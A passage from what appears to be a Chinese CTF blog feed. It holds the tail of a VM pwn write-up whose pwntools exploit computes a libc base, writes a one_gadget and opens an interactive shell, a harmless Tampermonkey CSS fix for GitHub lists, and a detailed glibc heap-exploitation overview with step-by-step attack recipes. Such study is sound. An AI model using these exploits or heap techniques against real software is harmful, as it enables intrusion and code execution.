0xxxxxxxxx</span></span><br><span class="line"><span class="comment"># x /20gx $rebase(0x40c0) 检验</span></span><br><span class="line"><span class="comment"># 可以将寄存器写入我们的内容，0x120开始是我们的内容</span></span><br><span class="line"><span class="comment"># og是便宜，至少用一次sub？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路：</span></span><br><span class="line"><span class="comment"># target写入code-&gt;读取到寄存器中备用</span></span><br><span class="line"><span class="comment"># 找一个libc地址-&gt;在我们的code里写入偏移-&gt;都读到寄存器里做sub出base-&gt;读入og-&gt;相加拿到og真实地址-&gt;将og写入target</span></span><br><span class="line"><span class="comment"># 好他妈的绕啊我操了 payload思路全有但是写着很费劲不知道怎么开始</span></span><br><span class="line"><span class="comment"># vm心魔？？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想办法先算出libc真实的基地址存在一个寄存器里</span></span><br><span class="line"><span class="comment"># onegadget = 0x</span></span><br><span class="line"><span class="comment"># 读取目标写入内容（og的偏移放在3了）</span></span><br><span class="line"><span class="comment"># payload = load(0,0x120,1) + load(0,0x124,2) + add(1,2,3)</span></span><br><span class="line"><span class="comment"># 读取一个偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取一个libc地址</span></span><br><span class="line"><span class="comment"># off: 0x29d90</span></span><br><span class="line"><span class="comment"># 常识：2.35的libc_start_main在栈上存储值偏移为0x29d90</span></span><br><span class="line">one_gadget = <span class="number">0x50a47</span></span><br><span class="line">payload = load(<span class="number">0</span>,<span class="number">0xd38</span>,<span class="number">1</span>) <span class="comment">#哦我sb了读是读8字节</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x140</span>,<span class="number">9</span>) + sub(<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>) <span class="comment"># 4是libc的基地址</span></span><br><span class="line"><span class="comment"># 草拟吗，这个地址在wsl kali里也一直跳</span></span><br><span class="line"><span class="comment"># 算og</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x138</span>,<span class="number">8</span>) + add(<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>) <span class="comment"># 5为og真实值</span></span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">payload += store(<span class="number">0</span>,<span class="number">0x118</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(one_gadget) + p64(<span class="number">0x29d90</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;opcode: &quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;h2 id=&quot;逆向虚拟机结构&quot;&gt;逆向虚拟机结构&lt;/h2&gt;
&lt;p&gt;这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="vm" scheme="https://zjw1nd.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>前端小实践之修复github列表渲染错误</title>
    <link href="https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/"/>
    <id>https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/</id>
    <published>2024-12-16T16:21:39.000Z</published>
    <updated>2024-12-17T02:50:21.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因-问题描述">起因/问题描述</h2><p>今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的<strong>列表</strong>都丢失了前缀。即本来应该是：</p><blockquote><p>1. xxx<br>2. xxx<br>· xxx</p></blockquote><p>但是实际渲染出来的效果只有缩进对齐而没有这些序号和点的前缀，看起来非常的难受，遂开始排查问题。</p><h2 id="检查过程">检查过程</h2><p>首先肯定是检查了源代码，markdown确认没有问题之后去github随便搜了个markdown的教程，发现也有这个问题，看来问题出在本地。</p><p>F12检查了一下源代码，markdown最后会被渲染成list：有序列表和无序列表分别是css中的ol和ul样式，列表项则是<code>&lt;li&gt;</code>。html中会采用<code>&lt;ul&gt;&lt;/ul&gt;</code>标签进行实现。</p><p>检查CSS样式发现，<code>&lt;li&gt;</code>对象的一个元素<code>list-style-type</code>的值居然是none，在注入的样式里覆盖了浏览器自己的User Agent样式。</p><p>打开一个列表显示正常的网站检查一下，要想显示前缀，这一项的值应该是<code>disc</code>才对。同时更换浏览器用手机打开发现是正常的</p><p>虽然我们不知道github提供的样式出了什么问题，但是我们似乎本地也不好修这个问题。</p><h2 id="结果">结果</h2><p>问AI，ai给了我一个tamper monkey的脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         GitHub List Style Fix</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Change github list.</span></span><br><span class="line"><span class="comment">// @author       Zj_W1nd</span></span><br><span class="line"><span class="comment">// @match        https://github.com/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加自定义样式</span></span><br><span class="line">    <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">        ul, ol &#123;</span></span><br><span class="line"><span class="string">            list-style-type: disc !important;</span></span><br><span class="line"><span class="string">            margin-left: 20px !important;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在github网页上强制修改前端的列表style，还真解决了这个问题。这么一搞感觉前端就是疯狂的各种标签和字段。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因-问题描述&quot;&gt;起因/问题描述&lt;/h2&gt;
&lt;p&gt;今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的&lt;strong&gt;列表&lt;/strong&gt;都丢失了前缀。即本来应该是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. xxx&lt;br&gt;
2. xxx&lt;</summary>
      
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
    <category term="前端" scheme="https://zjw1nd.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap总集篇导演剪辑剧场版</title>
    <link href="https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/"/>
    <id>https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/</id>
    <published>2024-12-13T04:00:00.000Z</published>
    <updated>2025-01-18T12:11:15.681Z</updated>
    
    <content type="html"><![CDATA[<p>~~摆了，~~可以参考：</p><ul class="lvl-0"><li class="lvl-2"><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a></li><li class="lvl-2">高版本的思路，包括libcgot表，_rtld_global的攻击等：<a href="https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=%E5%8F%AF%E4%BB%A5%E5%9C%A8%20Bi">https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=可以在 Bi</a><br>上文的总结对于细节更丰富也更好用，我自己也会参考。我自己写的导演剪辑版实在献丑。</li></ul><h1>Basic：</h1><h2 id="UAF">UAF</h2><p>free后指针不置空可以再次使用。</p><h2 id="Overflow">Overflow</h2><p>溢出，这个一般用于篡改size或prevsize域比较多，能溢出fd和bk也行。</p><h2 id="Off-By-One">Off By One</h2><p>只能溢出1字节。可以篡改下一个chunk的PREV_INUSE位造成合并等。</p><h2 id="Double-Free">Double Free</h2><p>多次释放同一堆块。接着通过分配可以获得指向同一堆块的多个不同指针。可以类型混淆，也可以获取UAF。</p><ul class="lvl-0"><li class="lvl-2"><p>对于fastbin chunk，PREV_INUSE永远为1，因此double free会有奇效。同时只检查第一块是否double free。</p></li></ul><h2 id="Overlap">Overlap</h2><p>重叠。本质上也是借助上面几个漏洞修改size（向前重叠）或者prevsize（向后重叠）域然后释放。这样就有一个chunk内部的一个额外指针了。<a href="https://zjw1nd.github.io/2023/12/03/How2Heap-2/">（未必）更加细节的介绍</a><br>house of Rabbit也是差不多</p><h2 id="Leak">Leak</h2><h3 id="Unsorted-Bin-Leak">Unsorted Bin Leak</h3><p>unsortedbin中的头部chunk的fd会指向main_arena+88的位置。只有一个chunk的话fd和bk都会指向其中。</p><h3 id="tcache-leak">tcache leak</h3><p>用tcache可以泄露堆的起始地址。</p><h3 id="其他">其他</h3><p>类似的放入bin中然后打出内容的思想都可以。</p><h2 id="hook">hook</h2><p>在2.34之前hook没有移除的情况下我们一直可以通过修改mallochook，freehook，reallochook等函数来劫持控制流。一般来说是将chunk分配到这里然后改成one_gadget。比如<a href="#House_of_Roman">House_of_Roman</a>中针对2.23的<code>malloc_hook-0x23</code>地方的fastbinchunk等等</p><p>然而实际利用中很多时候我们会发现所有的one_gadget都不满足的情况，这种时候该怎么办？下面是一些思路</p><ol><li class="lvl-3"><p>利用realloc_hook。观察<code>__libc_realloc</code>的代码可以发现，前面push了很多参数：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000846</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000846</span>C0                 push    r15             ; Alternative name is <span class="string">&#x27;__libc_realloc&#x27;</span></span><br><span class="line">.text:<span class="number">00000000000846</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000000846</span>C4                 push    r13</span><br><span class="line">.text:<span class="number">00000000000846</span>C6                 push    r12</span><br><span class="line">.text:<span class="number">00000000000846</span>C8                 mov     r13, rsi</span><br><span class="line">.text:<span class="number">00000000000846</span>CB                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000846</span>CC                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000846</span>CD                 mov     rbx, rdi</span><br><span class="line">.text:<span class="number">00000000000846</span>D0                 sub     rsp, <span class="number">38</span>h</span><br><span class="line">.text:<span class="number">00000000000846</span>D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">00000000000846</span>DB                 mov     rax, [rax]</span><br><span class="line">                 test    rax, rax</span><br><span class="line">                 jnz     loc_848E8 ;这里call rax</span><br></pre></td></tr></table></figure><p>realloc调整栈帧og触发，或者利用其他环境触发malloc包括doublefree异常–strdup等</p><p>realloc的意思是，我们在malloc_hook处填上realloc的地址，而在realloc_hook处填上one_gadget的地址，利用realloc调用前的这段push参数对栈帧进行微调。</p><h2 id="一些常识：">一些常识：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>tcache最多64个，每个最大连接7个chunk。下标就是按malloc_align分，以64位为例，0-24大小的对应idx0，25-40对应idx1，41-56对应idx2依次类推每个+16。然后32位就是0-12，13-20这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_MXFAST             <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br></pre></td></tr></table></figure><h1>Glibc 2.23</h1><blockquote><p>无tcache，检查较少，很经典</p></blockquote><h2 id="arena-attack（House-of-Mind-House-of-Gods）">arena attack（House of Mind &amp; House of Gods）</h2><p>实战利用价值小，看个乐</p><h3 id="House-of-mind">House of mind</h3><p>伪造arena，blog没写，是一种通过伪造arena从而将释放的chunk连入假arena的过程，利用比较抽象而且最后似乎还没有任意写。</p><h3 id="House-of-Gods">House of Gods</h3><p>利用arena结构体中的数据和错位实现在main_arena中构建一个chunk进行写入，然后篡改arena的next指针将堆变成我们自己的arena来劫持整个堆。具体参见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a>，虽然非常复杂没什么用但是可以看看这个堆风水的过程，非常的神必，有助于理解main_arena的结构：</p><ol><li class="lvl-3"><p>泄露unsorted bin 头的地址，malloc一个smallchunk然后直接读。通过free+malloc(intm)启动遍历过程，将位图置位。这个时候我们让bin[0]作为伪造的size域存在。此时它是0x200.</p></li><li class="lvl-3"><p>首先将smallchunk放回unsortedbin中。用上面的leak在main_arena内寻址。利用UAF修改smallchunk的bk，在unsortedbin里面链接上这个伪造chunk。</p></li><li class="lvl-3"><p>利用malloc_state的特性，修改fastbin chunk的bk字段然后将其释放，控制其在malloc_state的开头，接着作为一个伪造的bk字段存在，链接到INTM。巧妙至极。</p><blockquote><p>这时候的unsorted bin：head-&gt;smallchunk-&gt;binmap[last]（伪造的）-&gt;main_arena的开头（由于next指针开始就是指向本身的）-&gt;fast40-&gt;INTM</p></blockquote></li><li class="lvl-3"><p>将binmap chunk作为一个“chunk”取出。得到了写入main_arena（即便是部分）的权限！开始为触发<code>reused_arena()</code>的条件铺路。</p></li><li class="lvl-3"><p>接着UAF改INTM的bk，让INTM后面再连接上narenas字段。然后取出INTM触发unsortedbin attack，将narenas写为一个大数。同时用binmap chunk，改掉system_mem字段。</p></li><li class="lvl-3"><p>用binmap chunk将arena的next指针随便写成你想分配的地址</p></li><li class="lvl-3"><p>连续调用两次<code>malloc(0xffffffffffffffbf + 1)</code>，arena直接全部hijack掉。</p></li><li class="lvl-3"><p>随便操。</p></li></ol><h2 id="Top-chunk-related-attack（House-of-Force-House-of-Orange）">Top chunk related attack（House of Force &amp; House of Orange）</h2><p>利用topchunk的一些特性达成我们的目的。House of Force可以实现任意地址分配，House of Orange可以实现不调用free情况下的一次释放。</p><h3 id="House-of-Force">House of Force</h3><p>见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a><br>将top chunk的size域改到极大，然后通过分配evil_size的chunk将topchunk推进到我们想分配的地址，随后下次分配就会从top中切出我们指定地址的chunk。</p><ul class="lvl-0"><li class="lvl-2"><p>其中top的size一般写成-1，evil_size的计算如下</p></li></ul><blockquote><p>new_top = old_top + nb<br>nb = new_top - old_top<br>req + 2sizeof(long) = new_top - old_top<br>req = new_top - old_top - 2sizeof(long)<br>req = dest - 2sizeof(long) - old_top - 2sizeof(long)<br>req = dest - old_top - 4*sizeof(long)</p></blockquote><h3 id="House-of-Orange">House of Orange</h3><p>见<a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">How2Heap4</a><br>神中神，适用于没有free的情况。通过先改小top chunk的size域然后申请一个较大的chunk来触发sysmalloc中的brk扩展，就会将旧的top放进unsortedbin中。</p><ul class="lvl-0"><li class="lvl-2"><p>top的size需要页对齐，动调确定，一般改为0xfe1然后申请0x1000刚好。</p></li><li class="lvl-2"><p>新申请的会放在新的内存页。</p></li><li class="lvl-2"><p>【glibc 2.23】借助unsorted bin attack改写IO_LIST_ALL为unsorted(av)后将old top放入smallbins[4](改写size为0x61)从而实现用伪造chunk链接至IO_list_all触发fsop。</p></li></ul><h2 id="Fastbin（normal-house-of-spirit-House-of-Rabbit）">Fastbin（normal, house of spirit, House of Rabbit）</h2><p><a href="https://zjw1nd.github.io/2023/11/09/How2Heap-1/">（未必）更加细节的介绍</a></p><h3 id="Normal-fast-bin-attack：">Normal fast bin attack：</h3><p>将一个fastbin分配在我们想要的位置。通过劫持已在fastbin中的一个chunk的fd指针来做到这一点。</p><ul class="lvl-0"><li class="lvl-2"><p>会检查size域，需要提前伪装。</p></li><li class="lvl-2"><p>分配在malloc_hook或free_hook的话经常配合0x7f的字节错位来伪造size域</p></li><li class="lvl-2"><p>UAF和Double free，fastbin在2.23中只检查头部是否double free从而我们可以用dup来实现Write after free</p></li></ul><h3 id="House-of-Spirit">House of Spirit</h3><p>伪造fastbin的chunk。通过free放入bin。需要注意：</p><ul class="lvl-0"><li class="lvl-2"><p>边界0x10对齐</p></li><li class="lvl-2"><p>size域大小合适，满足fastbin要求</p></li><li class="lvl-2"><p>next的地址不能是top，而且size要正常（不用必须是fastbin）</p></li></ul><h3 id="House-of-Rabbit">House of Rabbit</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>针对consolidate不严格检查size的fastbin attack. 要能修改size域并且有触发consolidate的条件</p><ul class="lvl-0"><li class="lvl-2"><p>修改size，然后触发consolidate变成overlap。</p></li><li class="lvl-2"><p>修改fd然后触发consolidate将fake_chunk放入bin中变成合法chunk（注意伪造size）</p></li></ul><h2 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>利用Unsorted Bin取出chunk时候的这个特性（双向链表，bk遍历）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>控制住unsorted bin中的下一个会取出的chunk的bk域，我们就能将一个大数（<code>unsorted_chunks(av)</code>）写入我们想要的地址，由于是fd偏移，所以将chunk中的bk写成targetaddr-16即可。可以用于篡改循环次数或<code>GLOBAL_MAX_FAST</code>等。</p><h2 id="House-of-Lore（Small-bin-attack）">House of Lore（Small bin attack）</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>smallbin attack。一个UAF改一下smallchunk的fd就是任意地址fakechunk分配。只要能绕过smallbin分配唯一的检查就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Large-Bin-Attack">Large Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">参考</a><br>利用large bin的指针将指定地址的内容写成一个合法的large chunk的地址。将已经在largebin中的chunk的bk或bk_nextsize篡改为target-16、-32即可实现在下一次victim放入largebin时触发将victim写入target的效果。</p><ul class="lvl-0"><li class="lvl-2"><p>从 unsorted bin 中来的 large chunk 要紧跟在攻击过的large chunk后面，也就是要连在一个bin里，大小也要相邻。</p></li><li class="lvl-2"><p>可以篡改io_list_all进行fsop</p></li><li class="lvl-2"><p>可以帮助tcache smash unlink？</p></li></ul><h2 id="COMBO-FISTS-（House-of-Roman-House-of-Storm）">COMBO FISTS （House of Roman, House of Storm）</h2><p><span id="House_of_Roman"></span></p><h3 id="House-of-Roman（组合拳，getshell思路很常用而且允许爆破-Fastbin-atk-Unsorted-bin-atk）">House of Roman（组合拳，getshell思路很常用而且允许爆破, Fastbin atk + Unsorted bin atk）</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>通过分配一个malloc_hook附近的chunk（确切的说是在<code>malloc_hook-0x23</code>处获取一个fastbinchunk）写入one_gadget。<br>这个思路是非常好的，只要是2.23并且任意地址分配chunk就可以用来getshell。有libc地址最好，没有也没关系借助unsorted bin attack+爆破来实现。<br>原poc的流程如下：</p><ul class="lvl-0"><li class="lvl-2"><p>拿一个0x60的fastbin chunk 1（实际大小0x70）</p></li><li class="lvl-2"><p>分配一个不用的chunk，大小0x80，实际大小0x90，此时相对堆基址的偏移来到了0x100，这灵性的一步是为了待会我们改一个字节就能修改指针指向的chunk</p></li><li class="lvl-2"><p>分配一个0x80的chunk 2，等会放入unsorted bin，chunk2的地址此时是0x100对齐的</p></li><li class="lvl-2"><p>分配一个0x60的fastbin chunk 3，该chunk的偏移地址来到了0x190</p></li><li class="lvl-2"><p>释放chunk2，放入unsorted bin，此时其fd和bk存有main_arena+0x68</p></li><li class="lvl-2"><p>取0x60大小的chunk4（fake_libc_chunk），会从chunk2中进行分割，带有main_arena地址</p></li><li class="lvl-2"><p>读取取出的chunk4，泄露main_arena地址然后计算偏移获取malloc_hook</p></li><li class="lvl-2"><p>释放chunk3，放入fastbin</p></li><li class="lvl-2"><p>释放chunk1，接入fastbin链表头，其fd指向chunk3（0x190）</p></li><li class="lvl-2"><p>模拟一个UAF，写chunk1的fd一字节0x00将其fd指向0x100的chunk2（chunk 4）</p></li><li class="lvl-2"><p>写chunk4，修改低位地址令其fd指向目标地址</p></li><li class="lvl-2"><p>最后将fastbin中的chunk1和3取出，再次取就取到了malloc_hook-0x23处的chunk</p></li></ul><h3 id="House-of-Storm-unsorted-bin-atk-largebin-atk">House of Storm (unsorted bin atk + largebin atk)</h3><blockquote><p>BLOG没有写懒得补了写在这里，该技术实现任意地址chunk分配<br>2.26-2.28 需要tcache填满，再往后该漏洞不可用这个技术最关键的一步是largebin attack将fake_chunk地址写上一个堆地址，而且非常巧妙的利用了一个字节错位将其作为了size。下面是POC的流程</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>准备一个unsortedbin堆块一个largebin堆块，其中unsortedbin中的堆块要比largebin中的大 （还要防止top合并）</p></li><li class="lvl-2"><p>将unsortedbin的地址进行一下处理，算出一个移位偏移量。</p></li><li class="lvl-2"><p>将unsorted bin的chunk bk写为fake_chunk，将large chunk的bk写成fake_chunk+8</p></li><li class="lvl-2"><p>将large chunk的bk_nextsize写成fake chunk-0x18-shift_amount，shift是我们先前的偏移</p></li><li class="lvl-2"><p>利用一个large_bin attack将unsorted chunk的地址写入一个恰当的位置正好伪造出fakechunk的size</p></li><li class="lvl-2"><p>申请相应大小（堆地址高8位？）即可获得fake_chunk</p></li></ul><h2 id="House-of-Einhejar——off-by-null">House of Einhejar——off by null</h2><p><a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">参考</a><br>仅需off by one就能工作。控制住当前chunk的末8字节（prev_size写成evil_size，差值）然后溢出修改掉下一个chunk的PREV_INUSE位。然后通过free下一个chunk触发合并后，下次分配就能从指定地址取chunk了（prev_size错误合并，overlap）。</p><ul class="lvl-0"><li class="lvl-2"><p>由于off by one，最好溢出的下个chunk的size是0x100对齐的，便于改写</p></li><li class="lvl-2"><p>fakechunk的size要和我们修改的prev_size一致</p></li></ul><h2 id="Unsafe-Unlink">Unsafe Unlink</h2><p>利用Unlink实现overlap或指定地址写（确切地说是将target写成&amp;target-0x18）。但是这个POC中利用所需要的前置条件较多…需要同时修改被unlink的chunk的fd和bk以及下一chunk的prevsize和PREV_INUSE位，要求太高了。</p><h1>glibc 2.27</h1><blockquote><p>这个版本首次引入了tcache<br>下面会着重涉及tcache相关的攻击，同时大部分上面的攻击技巧都要和tcache打交道，比如先填满7个。</p></blockquote><h2 id="Fastbin">Fastbin</h2><p>同上，只是每次要先填满对应大小的7个tcache</p><h2 id="tcache">tcache</h2><p><a href="https://zjw1nd.github.io/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/">参考链接</a></p><h3 id="Same-as-fastbin">Same as fastbin</h3><p>和fastbin一样只不过更简单（没有了fastbin szie检查）。包括double free，house of spirit，tcache poison（对应fastbin attack）等。</p><h3 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h3><p>在有tcache的情况下替代unsorted bin attack实现任意地址写一个libc地址。同时还能构造fake chunk（任意地址chunk分配）。</p><ul class="lvl-0"><li class="lvl-2"><p>tcache空两个，拿到两个small bin和一个small bin的UAF，fake_chunk的bk写入target</p></li><li class="lvl-2"><p>修改后释放的smallbin块的bk为fake_chunk地址，<strong>calloc触发</strong>写入攻击，target被改同时tcache头部会链入fake_chunk</p></li><li class="lvl-2"><p>下次malloc会返回fake_chunk</p></li></ul><h3 id="House-of-botcake">House of botcake</h3><p>double free实现任意堆块分配。</p><ul class="lvl-0"><li class="lvl-2"><p>用0x110的堆块填满tcache，然后再释放两个相邻的0x110堆块（先a后b）放入unsorted bin并导致合并</p></li><li class="lvl-2"><p>取出一个0x110的chunk（从tcache），然后再次释放上一步中的a块，a块此时被放入tcache，这里形成了一个重叠</p></li><li class="lvl-2"><p>分配一个0x130的堆块，这会从unsorted bin中合并好的块切割，而这时候我们取得的这个chunk可以拿来修改tcache头部的a块</p></li><li class="lvl-2"><p>修改fd后malloc两次即可</p></li></ul><h1>glibc 2.34+</h1><h2 id="Glibc-2-31-House-of-Pig">Glibc 2.31 House of Pig</h2><h2 id="House-of-Kiwi">House of Kiwi</h2><h2 id="House-of-Apple">House of Apple</h2><p>一种思想。在glibc 2.34+的版本中已经没有了malloc_hook这种函数让我们一次就能getshell。堆利用的思想更多的集中到了FSOP上。</p><h3 id="v1">v1</h3><h3 id="v2">v2</h3><p>参考<a href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heap实战——强网杯2024babyheap</a>的板子用一次largebin attack将io_list_all劫持，然后将vtable换成wide版本来让内核从wvtable找函数调用从而规避检查，*（wdata+0xe0）+0x68就是能劫持控制流的地方。</p><p>值得注意的是，在我们劫持的时候，rdi中存放的是fp的地址（也就是我们劫持到的堆地址，借助一些gadget以及setcontext这种我们能够控制几乎所有的寄存器，只要堆上布局合理。<br>在setcontext最后会将[rdx+0xa8]的内容push到栈上然后ret，这也是我们ROP链路的开始。</p><h3 id="v3">v3</h3><h2 id="House-of-Banana">House of Banana</h2><p>攻击_rtld_global的一种方法。劫持rtld_global到可写堆块后通过伪造程序基地址或者finiarray的办法，让程序在调用exit()退出的时候执行我们想要执行的函数。<br>rtld_global的第一字段是linkmap结构体的地址，无论是伪造linkmap还是篡改本来的，再或者改掉程序基地址，我们最终是要让</p><h2 id="House-of-Emma">House of Emma</h2><h2 id="tlor-list">tlor_list</h2><h2 id="Libc-GOT">Libc_GOT</h2><h2 id="io-obstack">io_obstack</h2><h2 id="House-of-Cat">House of Cat</h2><h2 id="House-of-Water-glibc-2-39-newest">House of Water(glibc 2.39 newest)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;~~摆了，~~可以参考：&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31&quot;&gt;https://bbs.kan</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap-rust——qwb2024_chat-with-me</title>
    <link href="https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/"/>
    <id>https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/</id>
